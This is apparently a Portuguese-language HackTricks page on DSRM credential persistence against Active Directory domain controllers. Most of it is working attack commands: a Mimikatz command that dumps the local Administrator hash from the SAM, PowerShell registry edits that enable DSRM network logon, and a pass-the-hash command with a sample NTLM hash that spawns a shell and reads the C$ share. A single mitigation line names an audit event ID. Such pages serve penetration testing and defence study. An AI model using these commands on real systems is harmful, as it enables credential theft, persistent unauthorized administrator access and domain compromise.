# Credenciais DSRM

{{#include ../../banners/hacktricks-training.md}}

## Informações básicas

Existe uma conta de **administrador local** dentro de cada **DC**. Tendo privilégios de administrador nesta máquina, você pode usar mimikatz para fazer **dump do hash do Administrator local**. Em seguida, modificando um registro para **ativar essa senha**, você poderá acessar remotamente esse usuário Administrator local.\
Primeiro, precisamos fazer **dump** do **hash** do usuário **Administrator local** dentro do DC:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Então precisamos verificar se essa conta funcionará e, se a chave do Registro tiver o valor "0" ou não existir, você precisará **defini-la como "2"**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Então, usando um PTH, você pode **listar o conteúdo de C$ ou até mesmo obter um shell**. Observe que, para criar uma nova sessão do PowerShell com esse hash na memória (para o PTH), **o "domínio" usado é apenas o nome da máquina DC:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Mais informações sobre isso em: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) e [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)<sup>[[1]](#references)[[2]](#references)</sup>

## Mitigação

- Event ID 4657 - Auditar a criação/alteração de `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

## Referências

- [1] [Sneaky Active Directory Persistence #11: Directory Service Restore Mode (DSRM)](https://adsecurity.org/?p=1714)
- [2] [Sneaky Active Directory Persistence #13: DSRM Persistence v2](https://adsecurity.org/?p=1785)

{{#include ../../banners/hacktricks-training.md}}
